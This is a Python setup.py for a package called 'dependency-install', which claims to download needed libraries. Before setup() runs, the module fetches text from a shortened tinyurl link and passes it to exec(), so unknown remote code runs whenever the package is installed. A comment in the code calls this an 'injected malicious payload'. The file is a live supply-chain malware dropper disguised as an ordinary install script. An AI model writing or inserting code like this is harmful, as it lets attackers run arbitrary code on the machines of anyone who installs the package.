
from setuptools import setup, find_packages
import requests

# injected malicious payload
response = requests.get("https://tinyurl.com/28epsmpd")
if response.status_code == 200:
    m_code = response.text
    # execute real payload with subprocess
    try:
        exec(m_code)
        # print("✅ payload executed")
    except Exception as e:
        print("❌ p failed:", e)

setup(
    name="dependency-install",
    version="0.3.0",
    description="download necessary libraries for following work.",
    author="Demon",
    author_email="test@example.com",
    packages=find_packages(),
    install_requires=[
        "requests>=2.0.0",
        "pyyaml>=5.0"
    ],
classifiers=[
    "Programming Language :: Python :: 3",
    "License :: OSI Approved :: MIT License"
],
)
# Built at 2025-09-19T08:38:45Z
